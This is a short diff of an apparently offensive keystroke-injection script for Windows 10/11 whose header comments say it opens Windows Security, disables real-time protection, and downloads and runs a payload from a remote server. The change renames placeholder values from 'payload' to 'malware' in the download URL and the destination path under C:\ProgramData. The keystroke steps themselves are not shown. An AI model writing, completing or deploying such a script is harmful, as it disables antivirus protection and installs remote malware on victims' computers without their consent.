@@ -3,12 +3,12 @@ REM Author: haruslah
 REM Version: 1.0
 REM Description: This script opens Windows Security settings, disables real-time protection,
 REM              and then downloads and executes a payload from a remote server.
-REM Note: The code assumes your payload is payload.exe, change it to whatever your payload name is.
+REM Note: The code assumes your payload is malware.exe, change it to whatever your payload name is.
 REM Target: Windows 10/11
 
 REM --- Configuration ---
-DEFINE #DOWNLOAD_URL http://<payload-url>
-DEFINE #DEST_PATH C:\ProgramData\payload.exe
+DEFINE #DOWNLOAD_URL http://<malware-url>
+DEFINE #DEST_PATH C:\ProgramData\malware.exe
 
 REM --- Timing Delays (in ms) ---
 DEFINE #KEY_DELAY 50
